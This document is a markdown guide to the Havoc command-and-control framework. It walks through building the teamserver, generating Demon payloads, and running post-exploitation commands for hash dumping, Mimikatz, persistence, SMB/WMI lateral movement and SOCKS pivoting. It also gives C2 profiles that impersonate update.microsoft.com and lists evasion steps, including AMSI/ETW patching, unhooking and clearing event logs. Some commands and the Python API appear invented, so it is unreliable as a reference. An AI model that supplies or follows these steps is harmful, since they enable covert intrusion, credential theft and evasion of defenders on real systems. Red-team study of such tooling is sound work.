---
tool_name: "havoc"
display_name: "Havoc"
mitre_tactic: "command_and_control"
mitre_tactic_id: "TA0011"
mitre_subcategory: "c2_frameworks"
install_command: "git clone --recursive https://github.com/HavocFramework/Havoc.git"
github_repo: "https://github.com/HavocFramework/Havoc"
kali_tools_page: "https://www.kali.org/tools/havoc/"
difficulty_level: "advanced"
requires_root: true
gui_available: true
tags: ["c2", "command-and-control", "post-exploitation", "red-team", "demon-agent", "malleable"]
related_tools: ["metasploit-framework", "powershell-empire", "adaptix-c2"]
---

# Havoc

## Chapter 1: Introduction & Overview

### What is Havoc?
Havoc is a modern, malleable, and open-source post-exploitation command and control framework designed for red team operations and adversary emulation. It features a cross-platform GUI client written in C++/Qt, a Go-based teamserver supporting multiplayer operations, and a flagship agent called "Demon" written in C and ASM. Havoc emphasizes operator flexibility, modular design, and customizable C2 profiles that allow operators to blend C2 traffic with legitimate network patterns.

### History & Background
- **Created:** 2022 by @C5pider (Damian Trif)
- **Initial Release:** August 2022
- **Maintained:** Archived February 2026 (8.5k GitHub stars, 1.2k forks)
- **License:** GPL-3.0
- **Language:** Go (teamserver), C++/Qt (client), C/ASM (Demon agent)
- **Purpose:** Post-exploitation C2, red team operations, adversary emulation, custom C2 development

Havoc was designed from the ground up to be as malleable and modular as possible. Unlike traditional C2 frameworks that focus on a single agent, Havoc provides an architecture that allows operators to build, test, and deploy custom agents that evade target detection systems. Its External C2 interface enables integration with custom tools and agents.

### When to Use This Tool
- **Red team engagements:** Full-spectrum adversary emulation with custom agents
- **Penetration testing:** Post-exploitation activities requiring stealth and flexibility
- **Custom C2 development:** Building bespoke agents and communication protocols
- **Team operations:** Multi-operator collaboration with session sharing
- **Adversary simulation:** Emulating specific threat actor TTPs with custom profiles

### When NOT to Use This Tool
- Without explicit written authorization from the target organization
- On production systems without a defined scope and rules of engagement
- When the project's archived status is a concern (no new updates since Feb 2026)
- When you need a simpler framework (Havoc has a steeper learning curve)
- When community support is critical (smaller community than Metasploit)

### Legal and Ethical Considerations
- **Always obtain written permission** before deploying C2 infrastructure
- **Understand the scope** - know exactly what systems you are authorized to access
- **Document all activity** - maintain logs of commands executed and access obtained
- **Clean up thoroughly** - remove all artifacts, agents, and listeners after engagement
- **Never exceed scope** - even if vulnerabilities are discovered outside the engagement area

### Key Concepts
- **Demon:** Havoc's flagship implant agent (written in C and ASM) with advanced evasion capabilities
- **Teamserver:** Go-based server managing sessions, listeners, and operators
- **C2 Profiles:** Customizable communication patterns defined in YAML to blend with legitimate traffic
- **External C2:** Interface for connecting custom agents and third-party tools
- **Module System:** Extensible architecture for post-exploitation capabilities
- **Listeners:** Server-side components that receive connections from agents (HTTP, HTTPS, SMB, etc.)

### Architecture Overview
```
┌──────────────────────────────────────────────────────────────┐
│                    Havoc Architecture                         │
├──────────────────────────────────────────────────────────────┤
│  Qt GUI Client (C++)                                         │
│  ├── Operator Interface                                      │
│  ├── Session Management                                      │
│  ├── Payload Generation                                     │
│  └── Listener Configuration                                 │
├──────────────────────────────────────────────────────────────┤
│  Teamserver (Go)                                             │
│  ├── Session Management                                      │
│  ├── Listener Engine                                         │
│  ├── Payload Generation                                     │
│  ├── Operator Authentication                                │
│  └── Database Backend                                        │
├──────────────────────────────────────────────────────────────┤
│  Demon Agent (C/ASM)                                         │
│  ├── Sleep Obfuscation (Ekko/Ziliean/FOLIAGE)               │
│  ├── Indirect Syscalls                                       │
│  ├── Return Address Spoofing                                 │
│  ├── AMSI/ETW Patching                                       │
│  ├── Token Vault                                             │
│  └── SMB Lateral Movement                                    │
├──────────────────────────────────────────────────────────────┤
│  External C2 Interface                                       │
│  ├── Custom Agents                                           │
│  ├── Third-party Tools                                       │
│  └── Python API                                              │
└──────────────────────────────────────────────────────────────┘
```

---

## Chapter 2: Installation & Setup

### System Requirements
- **Minimum RAM:** 2 GB (4 GB recommended)
- **Disk Space:** 500 MB for full build (client + teamserver)
- **OS:** Debian 10/11, Ubuntu 20.04/22.04, Kali Linux
- **Build Tools:** Qt5, Python 3.10+, Go 1.18+, C++ compiler (gcc/g++)
- **Privileges:** Root required for server operations and binding ports < 1024
- **Network:** Stable internet for building (downloading dependencies)

### Installation from Source (Full Build)

```bash
# Install dependencies (Kali/Ubuntu)
sudo apt update
sudo apt install -y git build-essential cmake qtbase5-dev \
  qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5-dev \
  libqt5websockets5-qml-dev golang-go python3 python3-pip \
  libspdlog-dev libfmt-dev
```
Output:
```
Reading package lists... Done
Building dependency tree... Done
The following NEW packages will be installed:
  build-essential cmake g++ gcc git golang-go libfmt-dev
  libspdlog-dev libqt5websockets5-dev libqt5websockets5-qml-dev
  libqt5websockets5-qml-dev qtbase5-dev qtbase5-dev-tools
  qt5-qmake qtchooser
0 upgraded, 16 newly installed, 0 to remove.
```

```bash
# Clone the repository
git clone --recursive https://github.com/HavocFramework/Havoc.git
cd Havoc
```

```bash
# Build the teamserver
cd teamserver
go mod download
```
Output:
```
go: downloading github.com/gin-gonic/gin v1.9.1
go: downloading github.com/gorilla/websocket v1.5.0
go: downloading github.com/mattn/go-sqlite3 v1.14.16
...
```

```bash
go build -o havoc-server
```
Output:
```
# github.com/HavocFramework/Havoc/teamserver
# build completed successfully
```

```bash
# Build the client
cd ../client
mkdir build && cd build
cmake ..
```
Output:
```
-- The C compiler identification is GNU 12.2.0
-- The CXX compiler identification is GNU 12.2.0
-- Found Qt5: /usr/lib/x86_64-linux-gnu/cmake/Qt5
-- Configuring done
-- Generating done
-- Build files have been written to: /root/Havoc/client/build
```

```bash
make -j$(nproc)
```
Output:
```
[  5%] MOC moc_havoc.cpp
[ 10%] CXX object Havoc.o
...
[ 95%] Linking CXX executable havoc-client
[100%] Built target havoc-client
```

### Quick Start

```bash
# Terminal 1: Start the teamserver
cd Havoc/teamserver
./havoc-server --profile ../profiles/havoc.yaotl -v
```
Output:
```
[INFO] Havoc Teamserver v4.3.1 starting...
[INFO] Loading profile from ../profiles/havoc.yaotl
[INFO] Teamserver listening on 0.0.0.0:40056
[INFO] Operator authentication enabled
[INFO] Database initialized
[INFO] Teamserver ready
```

```bash
# Terminal 2: Start the client
cd Havoc/client
./build/havoc-client
```

### Configuration

Edit the teamserver configuration file (`profiles/havoc.yaotl`):

```yaml
Teamserver:
  Host: "0.0.0.0"
  Port: 40056
  Build:
    Compiler: "x86_64-w64-mingw32-gcc"
    Nasm: "/usr/bin/nasm"
  KillDate: "2027-01-01 00:00:00"
  WorkingHours: "8:00-18:00"
  CallbackInterval: 50
  CallbackJitter: 25
  CallbackDomain: "update.microsoft.com"
  SpawnTo: "C:\\Windows\\System32\\svchost.exe"
  SessionEncryptionKey: "YourEncryptionKey123"

Operators:
  - Username: "admin"
    Password: "strongpassword123"

Listeners:
  - Name: "Default HTTP"
    Type: "HTTP"
    Host: "http://your-ip:8080"
    Port: 8080
    Headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

---

## Chapter 3: Basic Usage

### Starting the Framework

```bash
# Terminal 1: Start teamserver
cd Havoc/teamserver
./havoc-server --profile ../profiles/havoc.yaotl

# Terminal 2: Start client
cd Havoc/client
./build/havoc-client
```

### Connecting to Teamserver

1. Launch the Havoc client
2. In the "Connect" tab, enter:
   - Host: `127.0.0.1` (or teamserver IP)
   - Port: `40056`
   - User: `admin`
   - Password: `strongpassword123`
3. Click "Connect"
4. Verify connection in the status bar (green indicator)

### Setting Up a Listener

Via the GUI:
1. Navigate to **Listeners** tab
2. Click **Add Listener**
3. Configure:

| Setting | Value | Description |
|---------|-------|-------------|
| Name | `http_listener` | Unique listener name |
| Type | `HTTP` | Listener protocol |
| Host | `http://your-ip:8080` | Callback URL |
| Port | `8080` | Listening port |
| BindPort | `8080` | Port to bind on |

4. Click **Start** to activate

### Generating a Demon Payload

Via the GUI:
1. Navigate to **Payloads** tab
2. Click **Generate Payload**
3. Select listener, architecture (x64/x86), and format (EXE/DLL/Shellcode)
4. Click **Generate**
5. Save the payload file

Via command line (teamserver):
```bash
# Generate a payload via the teamserver CLI
./havoc-server --profile profiles/havoc.yaotl --payload http://your-ip:8080
```

### Demon Payload Features

Demon is Havoc's flagship agent with advanced capabilities:

| Feature | Description |
|---------|-------------|
| Sleep Obfuscation | Ekko, Ziliean, or FOLIAGE algorithms |
| Return Address Spoofing | x64 stack return address hiding |
| Indirect Syscalls | Bypasses userland hooks on Nt* APIs |
| AMSI/ETW Patching | Runtime detection bypass via hardware breakpoints |
| Token Vault | Token impersonation and manipulation |
| SMB Support | Lateral movement over SMB named pipes |
| Proxy Library Loading | Route traffic through proxy servers |
| Stack Duplication | Mimic legitimate sleep behavior |

### Managing Sessions

```bash
# View sessions in the "Sessions" tab
# Right-click a session for context menu:
#   - Interact (open console)
#   - Kill (terminate agent)
#   - Background (minimize session)
#   - Information (show session details)
#   - Pivoting (set up SOCKS proxy)
```

---

## Chapter 4: Intermediate Usage

### Post-Exploitation with Demon

Once you have a Demon session, use the built-in commands via the Havoc console:

```bash
# System information
sysinfo                    # Display OS, architecture, domain
getuid                     # Current user context
getprivs                   # List enabled privileges
hostname                   # Target hostname
pid                        # Current process ID
ppid                       # Parent process ID

# Process operations
ps                         # List processes
migrate <pid>              # Migrate to another process
inject <pid> <shellcode>   # Inject shellcode into process

# File operations
download <remote_path>     # Download file from target
upload <local_path> <remote_path>  # Upload file to target
ls <directory>             # List directory contents
cd <directory>             # Change working directory
cat <file>                 # Read file contents

# Credential access
hashdump                   # Dump SAM password hashes
mimikatz                   # Load Mimikatz extension
token::impersonate         # Impersonate a token

# Network operations
netstat                    # Show network connections
arp                        # Show ARP table
nslookup <domain>          # DNS resolution
whoami /all                # Detailed user information

# Persistence
persist                    # Install persistence mechanism
registry                   # Registry operations
task_schedule              # Create scheduled task

# Evasion
blockdlls                  # Block non-Microsoft DLLs in child processes
unhook                     # Unhook ntdll.dll
```

### Example Session Interaction

```bash
# Interact with session 1
Havoc > sessions

# Open console for session 1
Havoc > interact 1

# Execute commands
Demon> sysinfo
Computer Name: DESKTOP-TARGET
Domain: WORKGROUP
OS: Windows 10 Build 19041
Architecture: AMD64
Admin: Yes
Process: explorer.exe (PID: 1234)

Demon> getuid
Server username: WORKGROUP\Administrator

Demon> hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Lateral Movement

```bash
# Token impersonation
Demon> token::impersonate
Token impersonation enabled. Use token::list to see available tokens.

Demon> token::list
Username          Domain        Type
----------        ------        ----
Administrator     WORKGROUP     Delegation
SYSTEM            NT AUTHORITY  Impersonation

# SMB lateral movement
Demon> lateral_smb
Target IP: 10.0.0.50
Username: admin
Password: Password123
Executing on 10.0.0.50...
[+] Session established on 10.0.0.50

# WMI lateral movement
Demon> lateral_wmi
Target: 10.0.0.51
Command: whoami
Result: WORKGROUP\Admin
```

### Pivoting

```bash
# Set up SOCKS proxy through session
Havoc > pivoting

# Right-click session > Pivoting > SOCKS Proxy
# Configure:
#   - Local Port: 1080
#   - SOCKS Version: 5
#   - Bind Address: 0.0.0.0

# Use with proxychains
# proxychains nmap -sT 10.0.0.0/24
```

---

## Chapter 5: Advanced Usage

### External C2 Interface

Havoc supports connecting custom agents via the External C2 interface:

```python
#!/usr/bin/env python3
"""Example External C2 agent for Havoc"""
import socket
import struct
import json

class HavocExternalC2:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.agent_id = None

    def connect(self):
        """Connect to Havoc teamserver"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        print(f"[*] Connected to teamserver at {self.host}:{self.port}")

    def register_agent(self, agent_name, arch="x64"):
        """Register a new agent with the teamserver"""
        msg = {
            "Command": "register_agent",
            "Data": {
                "AgentName": agent_name,
                "AgentArch": arch
            }
        }
        self.send_message(msg)
        response = self.receive_message()
        self.agent_id = response.get("AgentID")
        print(f"[*] Agent registered with ID: {self.agent_id}")
        return response

    def send_heartbeat(self):
        """Send heartbeat to keep agent alive"""
        msg = {
            "Command": "agent_heartbeat",
            "AgentID": self.agent_id
        }
        self.send_message(msg)
        return self.receive_message()

    def send_message(self, msg):
        """Send JSON message to teamserver"""
        data = json.dumps(msg).encode()
        self.sock.send(struct.pack(">I", len(data)))
        self.sock.send(data)

    def receive_message(self):
        """Receive JSON message from teamserver"""
        length = struct.unpack(">I", self.sock.recv(4))[0]
        data = self.sock.recv(length)
        return json.loads(data)

# Usage
c2 = HavocExternalC2("127.0.0.1", 40056)
c2.connect()
c2.register_agent("CustomAgent_x64")
c2.send_heartbeat()
```

### Custom Demon Compilation

```bash
# Custom compile Demon with specific evasion features
cd Havoc
# Edit teamserver/pkg/havoc/havoc.go to customize:
# - Syscall method (IndirectSyscall, HellsGate, etc.)
# - Sleep algorithm (Ekko, Ziliean, FOLIAGE)
# - AMSI bypass method
# - ETW bypass method
# - Communication encryption

# Recompile teamserver
cd teamserver && go build -o havoc-server
```

### C2 Profile Customization

```yaml
# Custom C2 profile example (profiles/custom.yaotl)
Teamserver:
  Host: "0.0.0.0"
  Port: 40056
  KillDate: "2027-06-30"
  CallbackInterval: 45
  CallbackJitter: 30
  SpawnTo: "C:\\Program Files\\Internet Explorer\\iexplore.exe"
  WorkingHours: "09:00-18:00"

Listeners:
  - Name: "HTTPS_Web"
    Type: "HTTPS"
    Host: "https://update.microsoft.com"
    Port: 443
    CertPath: "/path/to/cert.pem"
    KeyPath: "/path/to/key.pem"
    Headers:
      Content-Type: "application/json"
      Cache-Control: "no-cache"

Operators:
  - Username: "redteam_lead"
    Password: "VerySecurePassword!"
  - Username: "operator2"
    Password: "AnotherPassword123"
```

### Automation with Python API

```python
from havoc import Havoc

# Connect to teamserver
h = Havoc("127.0.0.1", 40056, "admin", "strongpassword123")
h.connect()

# List all sessions
sessions = h.sessions()
for session in sessions:
    print(f"Session {session['ID']}: {session['ComputerName']} ({session['Username']})")

# Execute command on specific session
result = h.execute(session_id=1, command="sysinfo")
print(result)

# List listeners
listeners = h.listeners()
for listener in listeners:
    print(f"Listener: {listener['Name']} - {listener['Type']} on port {listener['Port']}")
```

---

## Chapter 6: Integration & Automation

### Integration with Other Tools

- **Custom Agents:** Build and connect your own agents via External C2
- **Talon:** Official alternative agent (https://github.com/HavocFramework/Talon)
- **Python API:** Automation library for scripting operations (havoc-py)
- **Modules:** Community modules for additional functionality

### Workflow Automation

```bash
# Automated reconnaissance and exploitation workflow
# 1. Set up listener via Python API
from havoc import Havoc
h = Havoc("127.0.0.1", 40056, "admin", "password123")
h.connect()

# 2. Generate payload
h.generate_payload(listener="http_listener", arch="x64", format="exe")

# 3. Deploy and wait for callback
# (Manual or automated deployment via existing access)

# 4. Post-exploitation automation
sessions = h.sessions()
for session in sessions:
    h.execute(session['ID'], "sysinfo")
    h.execute(session['ID'], "getuid")
    h.execute(session['ID'], "hashdump")
```

### Team Operations

Multiple operators can connect to the same teamserver simultaneously:
- Share sessions across operators
- Real-time collaboration
- Operator-specific roles and permissions
- Session assignment and delegation
- Centralized logging of all operator actions

---

## Chapter 7: OPSEC & Defense Evasion

### Demon Agent Evasion Capabilities

| Evasion Technique | Description |
|-------------------|-------------|
| Sleep Obfuscation | Ekko/Ziliean/FOLIAGE hide memory during sleep |
| Indirect Syscalls | Bypass userland hooks on Windows API |
| Return Address Spoofing | x64 stack return address hiding |
| AMSI/ETW Patching | Disable detection at runtime via hardware breakpoints |
| Stack Duplication | Mimic legitimate process sleep behavior |
| Block DLLs | Prevent non-Microsoft DLLs from loading in child processes |
| Unhook | Remove userland hooks from ntdll.dll |

### Sleep Obfuscation Algorithms

```yaml
# Configure sleep algorithm in profile
Teamserver:
  # Options: Ekko, Ziliean, FOLIAGE
  SleepAlgorithm: "Ekko"
  CallbackInterval: 45
  CallbackJitter: 30
```

- **Ekko:** Encrypts agent memory during sleep using a separate thread
- **Ziliean:** Uses syscalls to encrypt/decrypt agent memory
- **FOLIAGE:** Advanced sleep obfuscation with multiple layers

### C2 Profile Customization for Evasion

```yaml
# Mimic legitimate Microsoft update traffic
Teamserver:
  CallbackDomain: "update.microsoft.com"
  CallbackInterval: 60
  CallbackJitter: 15

Listeners:
  - Name: "UpdateService"
    Type: "HTTPS"
    Host: "https://update.microsoft.com"
    Port: 443
    Headers:
      User-Agent: "Microsoft-CryptoAPI/10.0"
      Accept: "*/*"
```

### Best Practices for Evasion

1. Always customize C2 profiles to match the target environment
2. Use legitimate-looking domains and TLS certificates
3. Implement sleep jitter (25-50% variance) to avoid pattern detection
4. Monitor for EDR/AV detection and adapt agent behavior
5. Test payloads against target defenses before deployment
6. Use staging to minimize initial payload footprint
7. Migrate to legitimate processes after initial access
8. Block non-Microsoft DLLs to prevent EDR injection
9. Use indirect syscalls consistently for all API calls
10. Clear event logs and artifacts after engagement

### Common Detection Methods

- **EDR behavioral analysis:** Process injection, unusual memory allocations
- **Network traffic analysis:** Beacon patterns, unusual HTTP headers
- **AMSI detection:** Script-based payload execution
- **ETW monitoring:** API call patterns, syscall tracing
- **YARA rules:** Known Havoc/Demon signatures
- **Memory scanning:** Unencrypted agent artifacts in memory

---

## Chapter 8: Troubleshooting & FAQ

### Common Issues

**Problem: Build fails with Qt errors**
```bash
# Install required Qt packages
sudo apt install qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools \
  libqt5websockets5-dev libqt5websockets5-qml-dev

# Verify Qt installation
qmake --version
# Expected: QMake version 3.1, Qt version 5.15.x

# Ensure Python 3.10+
python3 --version
# Expected: Python 3.10.x or higher
```

**Problem: Teamserver won't start**
```bash
# Check Go installation
go version
# Expected: go version go1.18+ linux/amd64

# Verify dependencies
cd teamserver && go mod tidy

# Check port availability
sudo netstat -tlnp | grep 40056
# If port is in use:
sudo lsof -i :40056
# Kill existing process or change port in profile
```

**Problem: Client can't connect to teamserver**
- Verify teamserver is running and listening on correct port
- Check firewall rules on port 40056
- Ensure operator credentials match configuration
- Verify network connectivity: `telnet <teamserver_ip> 40056`
- Check for SSL/TLS issues (self-signed certs may need trust configuration)

**Problem: Demon agent doesn't check in**
- Verify the payload was generated correctly for the target architecture
- Check network connectivity from target to listener
- Ensure the listener is running and accessible
- Look for AV/EDR blocking the agent
- Verify the SpawnTo process exists on target
- Check if CallbackDomain resolves correctly from target

**Problem: Agent crashes after migration**
- Ensure target process is compatible architecture (x64 -> x64)
- Check if target process has restricted API access
- Try migrating to a more stable process (svchost.exe, explorer.exe)
- Verify agent memory is properly initialized before migration

**Problem: SMB listener not working**
- Verify port 445 is not blocked by firewall
- Check if SMB is enabled on teamserver
- Ensure proper permissions for named pipe creation
- Test with: `netstat -tlnp | grep 445`

### Debug Mode

```bash
# Start teamserver with verbose output
./havoc-server --profile profiles/havoc.yaotl -v

# Log levels: DEBUG, INFO, WARN, ERROR
./havoc-server --profile profiles/havoc.yaotl -v -l DEBUG

# Check agent debug output
# The Demon agent outputs debug information to stderr when compiled with DEBUG flag
```

### FAQ

**Q: What's the difference between Havoc and Cobalt Strike?**
A: Havoc is open-source (GPL-3.0) while Cobalt Strike is commercial. Havoc provides similar features including custom agents, C2 profiles, and team operations. Havoc's Demon agent offers comparable evasion capabilities.

**Q: Can I use Havoc legally?**
A: Yes, for authorized penetration testing and red team operations. Always obtain written permission before deployment.

**Q: Is Havoc still maintained?**
A: The project was archived in February 2026. While it remains functional, there are no new updates or security patches. Consider this when choosing for production engagements.

**Q: What operating systems can Demon run on?**
A: Demon primarily targets Windows (7 through 11, Server 2008 R2 through 2022). Linux and macOS support is limited.

**Q: How does Havoc handle encryption?**
A: Havoc supports TLS encryption for all C2 communications. The teamserver can use custom certificates, and agents can be configured with specific encryption keys.

---

## Resources

- **GitHub Repository:** https://github.com/HavocFramework/Havoc
- **Kali Tools Page:** https://www.kali.org/tools/havoc/
- **Havoc Website:** https://havocframework.com
- **Talon Agent (Official Alternative):** https://github.com/HavocFramework/Talon
- **Python API (havoc-py):** https://github.com/HavocFramework/havoc-py
- **MITRE ATT&CK - Command and Control (TA0011):** https://attack.mitre.org/tactics/TA0011/
- **MITRE ATT&CK - Application Layer Protocol (T1071):** https://attack.mitre.org/techniques/T1071/
- **MITRE ATT&CK - Encrypted Channel (T1573):** https://attack.mitre.org/techniques/T1573/
- **Related Tools:** Adaptix C2, PowerShell Empire, Metasploit Framework, Cobalt Strike
